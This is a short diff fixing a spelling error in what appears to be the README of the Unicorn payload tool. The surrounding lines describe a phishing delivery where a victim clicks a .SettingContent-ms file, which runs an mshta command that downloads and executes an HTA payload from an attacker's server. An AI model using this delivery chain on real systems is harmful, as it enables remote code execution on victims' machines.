@@ -311,7 +311,7 @@ mshta http://<apache_server_ip_or_dns_name/Launcher.hta.
 Then move the contents of the hta_attack to /var/www/html.
 
 Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
-then download the Unicorn HTA file which has the code execution capabilites. 
+then download the Unicorn HTA file which has the code execution capabilities. 
 
 Special thanks and kudos to Matt Nelson for the awesome research
 
